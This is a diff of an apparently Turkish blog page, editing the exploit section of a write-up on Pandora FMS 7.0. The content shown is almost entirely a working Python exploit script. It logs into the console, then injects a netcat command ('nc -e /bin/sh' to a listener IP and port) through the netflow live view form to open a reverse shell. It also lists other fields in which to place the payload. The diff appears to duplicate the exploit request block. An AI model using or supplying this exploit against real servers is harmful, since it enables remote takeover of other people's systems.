@@ -135,45 +135,42 @@ exploit kodunu PANDORAFMS uygulamasına göre uyarladım ve sonuç olarak çalı
 <p><strong>BÖLÜM 4: EXPLOIT</p></strong>
     
     <div class="highlight"><pre><span></span>
-    <*
-    PANDORAFMS 7.0 Remote Code Execution
-    This exploit created by Engin Demirbilek.
-    Github: github.com/EnginDemirbilek
-    
-    *>
+'''
+PANDORAFMS 7.0 Authenticated Remote Code Execution x4
+This exploits can be edited to exploit 4x Authenticated RCE vulnerabilities exist on PANDORAFMS.
+incase default vulnerable variable won't work, change the position of payload to  one of the following ip_src, dst_port, src_port
+
+Author: Engin Demirbilek
+Github: github.com/EnginDemirbilek
+
+'''
 import requests
 import sys
 
- #Check if all parameters are setted.
-if len(sys.argv) < 6:   
+if len(sys.argv) < 6:
 	print "Usage: ./exploit.py <http://url> <username> <password> <listenerIP> <listenerPort>"
 	exit()
 
- #Set variables
 url = sys.argv[1]
 user = sys.argv[2]
 password = sys.argv[3]
 payload = '";nc -e /bin/sh ' + sys.argv[4] + ' ' + sys.argv[5] + ' ' + '#'
 
-#POST variables for login
 login = {
 	'nick':user,
 	'pass':password,
 	'login_button':'Login'
 }
- #Login and get session
 req = requests.Session()
 print "Sendin login request ..."
 login = req.post(url+"/pandora_console/index.php?login=1", data=login)
 
-#Check if login is succesfull.
 if login.status_code != 200:
 	print "[-] Seems like credentials are wrong."
 	exit()
 else:
 	print "[+] Succesfully logged in !"
 
-#Post variables for vulnerable page.
 payload = {
 	'date':"",
 	'time':"",
@@ -199,6 +196,17 @@ payload = {
 }
 
 print "[+] Sendin exploit ..."
+
+exploit = req.post(url+"/pandora_console/index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0",cookies=req.cookies, data=payload, headers={
+'User-Agent':'Mozilla/5.0 Gecko/20100101 Firefox/72.0',
+'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+'Accept-Encoding':'gzip, deflate',
+'Content-Type':'application/x-www-form-urlencoded'})
+
+if exploit.status_code == 200:
+	print "[+] Everything seems ok, check your listener."
+else:
+	print "[-] Exploit failed. You can change position of payload to ip_src, dst_port or src_port and try again."
 
 exploit = req.post(url+"/pandora_console/index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0",cookies=req.cookies, data=payload, headers={
 'User-Agent':'Mozilla/5.0 Gecko/20100101 Firefox/72.0',
